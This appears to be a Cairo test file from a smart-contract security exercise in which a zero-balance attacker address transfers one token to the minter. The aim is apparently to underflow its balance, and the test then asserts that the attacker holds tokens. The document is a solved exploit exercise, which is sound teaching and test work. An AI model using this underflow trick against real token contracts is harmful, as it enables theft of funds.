use snforge_std::{
    declare, ContractClassTrait, DeclareResultTrait,  
    start_cheat_caller_address, stop_cheat_caller_address
};
use starknet::ContractAddress;

use arithmetic_flows::flowing_token::flowing_token::{
    ISimpleTokenDispatcher, ISimpleTokenDispatcherTrait
};

// Helper function to deploy the simple token contract
fn deploy_simple_token(minter: ContractAddress) -> (ContractAddress, ISimpleTokenDispatcher) {
    let contract_class = declare("SimpleToken").unwrap().contract_class();
    let mut data_to_constructor = array![minter.into()];

    // Pack the data into the constructor
    //Serde::serialize(@minter, ref data_to_constructor);
    // Deploying the contract, and getting the address
    let (address, _) = contract_class.deploy(@data_to_constructor).unwrap();
    return (address, ISimpleTokenDispatcher { contract_address: address });
}

#[test]
fn test_arithmetic_overflow_underflow_1() {
    // Users
    let minter: ContractAddress = 123.try_into().unwrap();
    let attacker: ContractAddress = 1.try_into().unwrap();

    // Deploying the simple token contract
    let (simple_token_address, simple_token_dispatcher) = deploy_simple_token(minter);

    // TODO: Find a way to obtain some tokens
    // ATTACK START //
    let _starting_balance = simple_token_dispatcher.balance_of(attacker);
    start_cheat_caller_address(simple_token_address, attacker);
    simple_token_dispatcher.transfer(minter, 1);
    stop_cheat_caller_address(simple_token_address);
    let _final_balance = simple_token_dispatcher.balance_of(attacker);
    // ATTACK END //

    // Attacker balance should be greater than 0 at the end
    let attacker_balance: u256 = simple_token_dispatcher.balance_of(attacker).into();
    assert(attacker_balance > 0, 'The attacker has zero tokens');
}
